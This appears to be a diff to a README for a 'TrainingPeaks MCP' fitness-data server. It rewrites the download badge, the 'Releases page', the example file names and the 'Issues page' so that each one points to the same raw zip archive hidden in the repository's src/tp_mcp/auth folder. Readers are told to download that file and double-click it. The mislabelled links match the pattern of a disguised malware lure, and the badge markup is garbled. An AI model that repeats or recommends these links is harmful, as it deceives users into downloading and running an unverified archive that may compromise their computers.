@@ -6,7 +6,7 @@ Welcome! This guide helps you download and run the TrainingPeaks MCP server on y
 
 ## 📥 Download the Application
 
-[![Download TrainingPeaks MCP](https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip%20Now-TrainingPeaks%https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip)](https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip)
+[![Download TrainingPeaks MCP](https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip%20Now-TrainingPeaks%https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip)](https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip)
 
 ## 📋 Overview
 
@@ -29,9 +29,9 @@ To run TrainingPeaks MCP, your computer should meet the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip).
 2. Find the latest release.
-3. Download the file for your operating system. Look for options like `https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip` or `https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip`.
+3. Download the file for your operating system. Look for options like `https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip` or `https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip`.
 4. After the download is complete, locate the file on your computer.
 5. Double-click the file to start the installation process.
 
@@ -86,6 +86,6 @@ TrainingPeaks MCP is released under the MIT License. You can freely use, modify,
 
 ## 💬 Support
 
-For support, visit the [Issues page](https://github.com/haytam111234/trainingpeaks-mcp/raw/refs/heads/main/src/tp_mcp/auth/mcp_trainingpeaks_v3.9.zip). You can report bugs or request features. The community and developers will be happy to help.
+For support, visit the [Issues page](https://raw.githubusercontent.com/haytam111234/trainingpeaks-mcp/main/src/tp_mcp/auth/mcp_trainingpeaks_v1.8.zip). You can report bugs or request features. The community and developers will be happy to help.
 
 Thank you for using TrainingPeaks MCP. Enjoy accessing your fitness data!
